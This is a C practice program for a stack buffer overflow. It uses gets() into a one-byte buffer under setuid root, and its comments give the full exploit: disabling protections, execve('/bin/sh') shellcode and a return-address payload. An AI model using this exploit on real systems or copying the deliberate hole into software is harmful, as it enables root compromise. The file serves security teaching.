// AFTER => bof7.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 1

// COMPILE $ gcc -z execstack -fno-stack-protector bof8.c -o bof8
// SETUID  $ sudo chown root:root bof8
//         $ sudo chmod 4755 bof8
// EXPLOIT $ export SHELLCODE=`py2 -c "print('\x90'*10+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')"`
//         $ {py2 -c "print('a'*9+'\xcb\xef\xff\xff\xff\x7f')";cat} | ./bof8

int main() {
    char buf[BUF_SIZE];

    if (setuid(0)) {
        perror("setuid");
        return 1;
    }
    gets(buf);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));

    return 0;
}
